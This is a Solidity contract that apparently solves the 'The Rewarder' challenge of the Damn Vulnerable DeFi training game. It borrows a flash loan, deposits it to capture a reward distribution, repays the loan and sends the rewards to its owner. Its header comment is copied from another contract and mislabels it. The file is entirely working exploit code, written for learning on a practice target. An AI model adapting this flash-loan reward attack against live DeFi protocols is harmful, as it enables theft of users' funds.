// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import 'solady/src/utils/SafeTransferLib.sol';
import '../DamnValuableToken.sol';
import './TheRewarderPool.sol';
import './FlashLoanerPool.sol';

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */
contract RewarderPoolAttacker {
  TheRewarderPool theRewarderPool;
  FlashLoanerPool flashLoanerPool;
  ERC20 rewardToken;
  address owner;

  constructor(
    TheRewarderPool theRewarderPool_,
    FlashLoanerPool flashLoanerPool_,
    ERC20 rewardToken_,
    address owner_
  ) {
    theRewarderPool = theRewarderPool_;
    flashLoanerPool = flashLoanerPool_;

    rewardToken = rewardToken_;

    owner = owner_;
  }

  function attack() external {
    flashLoanerPool.flashLoan(1000000 ether);
  }

  function receiveFlashLoan(uint256 amount) external {
    address liquidityToken = theRewarderPool.liquidityToken();

    SafeTransferLib.safeApprove(
      liquidityToken,
      address(theRewarderPool),
      amount
    );

    theRewarderPool.deposit(amount);

    distributeRewards();

    theRewarderPool.withdraw(amount);

    SafeTransferLib.safeTransfer(
      liquidityToken,
      address(flashLoanerPool),
      amount
    );
  }

  function distributeRewards() public {
    theRewarderPool.distributeRewards();

    rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
  }
}
